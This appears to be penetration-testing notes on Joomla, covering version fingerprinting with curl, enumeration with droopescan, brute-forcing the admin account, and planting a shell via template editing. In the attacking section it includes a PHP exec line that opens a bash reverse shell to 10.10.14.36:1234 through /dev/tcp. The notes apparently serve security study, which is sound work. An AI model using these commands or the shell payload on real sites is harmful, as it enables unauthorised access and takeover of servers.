# Joomla

The use of a CMS on a web application is usually quite easy to spot with visual elements:

* Credits at the bottom or corner of pages
* HTTP headers
* Common files (e.g. `robots.txt`, `sitemap.xml`)
* Comments and metadata (HTML, CSS, JavaScript)
* Stack traces and verbose error messages

### Discovery / Footprinting

```shellscript
# From source code
curl -s <URL> | grep Joomla

# From readme.txt
curl -s <URL>/README.txt | head -n 5

# In certain versions => the most accurate
curl -s <URL>/administrator/manifests/files/joomla.xml | xmllint --format -

# The cache.xml file can help to give us the approximate version. It is located at 
# plugins/system/cache/cache.xml
```

The robots.txt file on a Joomla site often looks like below

```shellscript
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

### Enumeration

```shellscript
droopescan scan joomla --url <URL>
```

### Attacking

#### Brute force

The default administrator account on Joomla installs is `admin`, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very\
weak/common password and we can get in with some guesswork or light brute-forcing

```shellscript
# Brute force => no output until match
https://github.com/ajnik/joomla-bruteforce
sudo python3 joomla-brute.py -u <URL> -w <WORDLIST> -usr admin
```

#### Abusing Built-In Functionality

For this attack, we will need administrative access to the application (admin credentials)

Navigate to `/administrator` and login ⇒ `Templates` ⇒ select a template ⇒ select a page

```shellscript
# Insert a shell in the source code
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.36/1234 0>&1'"); 

# Update on the bottom and navigate to the page to execute the code
# Templates are located at /templates/<TEMPLATE>/<MODIFIED_PHP_FILE>
curl -s <URL>/templates/protostar/error.php
```

#### Leveraging Known Vulnerabilities

Find version and look for known exploits
